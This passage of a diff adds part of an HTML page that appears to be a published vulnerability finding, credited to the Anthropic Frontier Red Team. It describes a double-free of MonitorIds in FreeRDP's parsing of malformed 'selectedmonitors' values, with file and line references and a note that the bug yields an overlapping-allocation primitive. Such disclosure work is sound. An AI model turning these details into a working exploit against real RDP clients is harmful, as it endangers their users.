+    &#34;4. The error propagates up and the client calls freerdp_client_context_free → freerdp_settings_free, which frees the dangling MonitorIds pointer a second time at settings.c:1442-1443.&#34;,
+    &#34;5. Intervening heap activity (freerdp_client_rdp_file_free string frees, status printing, ContextFree callbacks) recycles the chunk between the two frees, yielding an overlapping-allocation primitive.&#34;
+  ],
+  &#34;technical_details&#34;: &#34;freerdp_settings_get_pointer_writable() returns the raw settings-&gt;MonitorIds pointer (settings_getters.c:4145-4146), not a copy, so ownership remains with the settings object. When a selectedmonitors token overflows strtoul (val &gt;= UINT32_MAX with errno set), the error branch at file.c:2536 calls free(list) directly and returns FALSE, but settings-&gt;MonitorIds still points to the freed memory. During client teardown (freerdp_client_context_free → rdp_free → freerdp_settings_free → freerdp_settings_free_keys), the dangling MonitorIds pointer is passed to free() a second time at libfreerdp/common/settings.c:1442-1443, producing a double-free.&#34;,
+  &#34;title&#34;: &#34;Double-free of MonitorIds when parsing malformed selectedmonitors&#34;,
+  &#34;vendor_severity&#34;: &#34;high&#34;
+}</pre>
+</details>
+</main>
+<footer>
+  <p>Anthropic Frontier Red Team</p>
+  <p>Snapshot generated at 2026-11-02 19:30 UTC</p>
+  <p>Dates and times are in UTC</p>
+  <p>Manifest hash <code>25d811e7b56632ef5bbb23eb…</code></p>
+  <p>Archived snapshots remain available at their dated paths so any figure can be verified against the page that was live on that date</p>
+  <p><a href="../data/payload.json">payload.json</a></p>
+</footer>
+<script src="../assets/figures.js" data-root="../"></script>
+<script src="../assets/ledger.js"></script>
+</body>
+</html>
